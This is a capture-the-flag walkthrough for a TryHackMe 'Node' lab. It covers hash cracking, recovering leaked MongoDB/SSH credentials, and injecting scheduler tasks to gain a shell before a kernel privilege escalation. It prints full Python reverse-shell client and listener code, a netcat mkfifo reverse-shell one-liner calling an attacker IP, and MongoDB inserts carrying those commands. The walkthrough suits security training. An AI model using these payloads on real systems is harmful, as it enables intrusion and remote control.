<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>node1</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body>First we start out with some basic enumeration:<br /><br />sudo nmap -A 10.10.123.120<br /><br /><img src="images/14-1.png" alt="images/14-1.png" /><br /><br />We find that SSH is open as well as port 3000.  Inspection of the source code for website hosted at 10.10.123.120:3000 reveals some interesting script names:<br /><br /><img src="images/14-2.png" alt="images/14-2.png" /><br /><br />In particular, home.js reveals another path, which we're able to access as well.<br /><br /><img src="images/14-3.png" alt="images/14-3.png" /><br /><br /><img src="images/14-4.png" alt="images/14-4.png" /><br /><br />Shaving off a bit of the path reveals an admin account as well:<br /><br /><img src="images/14-5.png" alt="images/14-5.png" /><br /><br />We can use hash-identifier to determine that this probably SHA-256:<br /><br /><img src="images/14-6.png" alt="images/14-6.png" /><br /><br />Then proceed to use hashcat to try to crack the admin account, with 1400 corresponding to SHA-256.<br /><br /><img src="images/14-7.png" alt="images/14-7.png" /><br /><br /><img src="images/14-8.png" alt="images/14-8.png" /><br /><br />We can now go back to the main page and log in with these credentials.<br /><br /><img src="images/14-9.png" alt="images/14-9.png" /><br /><br />Checking out the file that we can download after logging in, it looks to be encoded.  <br /><br /><img src="images/14-10.png" alt="images/14-10.png" /><br /><br />Throwing the file up on CyberChef and using the Magic function with defaults reveals that this was a B64 encoded zip file.<br /><br /><img src="images/14-11.png" alt="images/14-11.png" /><br /><br />You can then click to load the recipe as noted in the first output field and download the result, renaming it as filename.zip.  However, as Zeddicus Zu'l Zorander once said: “Nothing is ever easy.” - the zip is also password protected.<br /><br /><img src="images/14-12.png" alt="images/14-12.png" /><br /><br />Ok, well maybe that <em>was</em> easy.  Now we can dig through the files.  We find some fantastic artwork in app.js...<br /><br /><img src="images/14-13.png" alt="images/14-13.png" /><br /><br />...but don't let that distract us from the user mark's mongodb credentials in plaintext on top.<br /><br /><img src="images/14-14.png" alt="images/14-14.png" /><br /><br />As it turns out, these are also the SSH credentials for mark.  This password is actually the TryHackMe user flag too, even though you'll find a file called user.txt in the user tom's directory upon logging in as mark.<br /><br />Once inside, checking out the processes reveals that tom is running that app.js file using the binary /usr/bin/node from two spots: /var/www (which is the path we had the backup file for), but also /var/scheduler.   The version of this in /var/schedule is really interesting, however.<br /><br /><img src="images/14-15.png" alt="images/14-15.png" /><br /><br /><img src="images/14-16.png" alt="images/14-16.png" /><br /><br />It appears that this version of app.js connects to the database, reads from ‘tasks’, executes whatever command is there, then deletes the entry every 30 seconds.<br /><br /><br />After much frustration, we can figure out the syntax needed to actually make a connection to the database with the intent of adding a task that opens up a shell to our machine.  It seemed like it was going to be as simple as using the contents of the url variable, but authMechanism actually needed to be removed for this to work correctly.<br /><br />mongo mongodb://mark:markspw@localhost:27017/scheduler?authSource=scheduler<br /><br />Before we go further, we can grab some code for a reverse shell.  <br /><br /><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br /><br />One strategy is to add a command that runs netcat, since that is on the target machine.  As information in the link above provides, since the target machine doesn't allow the -e flag, we have to use the syntax ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f’<br /><br />Another strategy, since we can write to the /tmp directory, is to use a Python 3 script.  The advantage here is that we can test communications by just using mark's account first and elimate this as a potential issue if our payload doesn't work.<br /><br /><a href="https://github.com/trackmastersteve/shell">https://github.com/trackmastersteve/shell</a><br /><br /><span style="text-decoration:underline;">This code goes on the target machine in the /tmp directory:</span><br /><br />#!/usr/bin/python3<br /><br />import os<br />import socket<br />import subprocess<br /><br />HOST = '10.11.3.185' # The ip of the listener.<br />PORT = 2468 # The same port as listener.<br /><br />s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />s.connect((HOST, PORT)) # Connect to listener.<br />s.send(str.encode("[*] Connection Established!")) # Send connection confirmation.<br /><br />while 1: # Start loop.<br />    data = s.recv(1024).decode("UTF-8") # Recieve shell command.<br />    if data == "quit": <br />        break # If it's quit, then break out and close socket.<br />    if data[:2] == "cd":<br />        os.chdir(data[3:]) # If it's cd, change directory.<br />    # Run shell command.<br />    if len(data) &gt; 0:<br />        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) <br />        stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.<br />        output_str = str(stdout_value, "UTF-8") # Format output.<br />        currentWD = os.getcwd() + "&gt; " # Get current working directory.<br />        s.send(str.encode(currentWD + output_str)) # Send output to listener.<br />    <br />s.close() # Close socket.<br /><br /><span style="text-decoration:underline;">This code goes on our machine:</span><br /><br />#!/usr/bin/python3<br /><br />from socket import *<br /><br />HOST = '' # '' means bind to all interfaces.<br />PORT = 2468 #  Port.<br /><br />s = socket(AF_INET, SOCK_STREAM) # Create our socket handler.<br />s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) # Set is so that when we cancel out we can reuse port.<br />try:<br />    s.bind((HOST, PORT)) # Bind to interface.<br />    print("[*] Listening on 0.0.0.0:%s" % str(PORT)) # Print we are accepting connections.<br />    s.listen(10) # Listen for only 10 unaccepted connections.<br />    conn, addr = s.accept() # Accept connections.<br />    print("[+] Connected by", addr) # Print connected by ipaddress.<br />    data = conn.recv(1024).decode("UTF-8") # Receive initial connection.<br />    while 1: # Start loop.<br />        command = input("target_machine&gt; ") # Enter shell command.<br />        conn.send(bytes(command, "UTF-8")) # Send shell command.<br />        if command == "quit":<br />            break # If we specify quit then break out of loop and close socket.<br />        data = conn.recv(1024).decode("UTF-8") # Receive output from command.<br />        print(data) # Print the output of the command.<br />except KeyboardInterrupt: <br />    print("...listener terminated using [ctrl+c], Shutting down!")<br />    exit() # Using [ctrl+c] will terminate the listener.<br />    <br />conn.close() # Close socket.<br /><br /> <img src="images/14-17.png" alt="images/14-17.png" /><br /> <br /> <img src="images/14-18.png" alt="images/14-18.png" /><br /> <br /> Now that we know we can establish a reverse shell with no problems, lets try to run this by modifying the mongo db task list.  We need to make sure to run the listener on our machine first.<br /><br />db.tasks.insert({ "cmd": “python3 /tmp/sayhello.py” });<br /><br />Note:  Copy/pasting the command into the console may create some syntax errors (possibly due to non-printable characters), so you may have to type this out manually.<br /><br /><img src="images/14-19.png" alt="images/14-19.png" /><br /><br /><img src="images/14-20.png" alt="images/14-20.png" /><br /><br />Using the netcat method (which is admittedly cleaner and less buggy while poking around) looks like this:<br /><br />db.tasks.insert({ "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.3.185 2468 &gt;/tmp/f" });<br /><br /><img src="images/14-21.png" alt="images/14-21.png" /><br /><br /><img src="images/14-22.png" alt="images/14-22.png" /><br /><br />Either way, we wind up with this piece of information:<br /><br /><img src="images/14-23.png" alt="images/14-23.png" /><br /><br />Using searchsploit, we can find some privilege escalation scripts for this kernel version.<br /><br /><img src="images/14-24.png" alt="images/14-24.png" /><br /><br />We can copy the source over and build it.  (Sublime Text 3 was used in the image below; 41457 was tried first but it didn't seem to work, but 44298 did).<br /><br /><img src="images/14-25.png" alt="images/14-25.png" /><br /><br />Then we can set up a local web server to make it easy to grab the built exploit.<br /><br /><img src="images/14-26.png" alt="images/14-26.png" /><br /><br />We cd into the tmp directory again, download the exploit, change the permissions, execute it to get root and cd into the /root directory to find the flag.<br /><br /><img src="images/14-27.png" alt="images/14-27.png" /><br /><br /><br /><br /></body></html>